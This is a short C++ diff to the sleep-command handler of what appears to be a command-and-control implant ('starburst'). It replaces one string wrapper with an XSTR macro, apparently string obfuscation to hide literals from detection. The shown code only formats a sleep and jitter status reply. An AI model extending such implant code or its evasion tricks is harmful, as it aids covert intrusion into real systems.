@@ -24,14 +24,14 @@ auto declfn starburst::cmd_sleep(
     inst.agent.jitter_pct = jitter;
 
     char msg[64] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "sleep " ) ) );
+    str_copy( msg, XSTR( "sleep " ) );
     char num[12];
     int_to_str( num, interval, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( "ms jitter " ) ) );
+    str_concat( msg, XSTR( "ms jitter " ) );
     int_to_str( num, jitter, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( "%" ) ) );
+    str_concat( msg, XSTR( "%" ) );
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, msg );
 }
